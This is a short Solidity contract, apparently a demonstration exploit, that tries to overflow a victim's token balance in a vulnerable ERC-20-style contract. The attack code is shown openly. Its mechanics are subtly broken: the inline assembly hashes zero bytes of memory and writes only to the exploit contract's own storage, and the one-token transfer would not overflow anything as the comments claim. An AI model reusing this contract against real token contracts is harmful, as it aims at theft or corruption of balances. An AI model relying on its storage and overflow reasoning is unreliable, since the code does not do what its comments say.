pragma solidity ^0.4.10;

interface IVulnerable {
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address addr) external view returns (uint256);
}

contract ExploitIntegerOverflow {
    IVulnerable public vulnerable;

    constructor(address _target) public {
        vulnerable = IVulnerable(_target);
    }

    function attack(address _victim) public {
        // Step 1: Set attacker balance to near max
        // Directly write to storage in this test; in real world, would need privileged or indirect initialization
        // Simulate setting balanceOf[attacker] = 2^256 - 1
        // This step assumes attacker has sufficient control or contract logic allows initializing balance arbitrarily
        uint256 max = 2**256 - 1;

        // Bypass requires by initially having enough balance
        // Normally you would need the attacker to already have balance == max - x
        // For demonstration, assume attacker has a large balance
        assembly {
            sstore(keccak256(caller(), 0), max)
        }

        // Step 2: Transfer 1 token to victim — should cause overflow in victim balance
        vulnerable.transfer(_victim, 1);
    }

    // Helper: check victim balance after attack
    function checkBalance(address victim) public view returns (uint256) {
        return vulnerable.balanceOf(victim);
    }
}

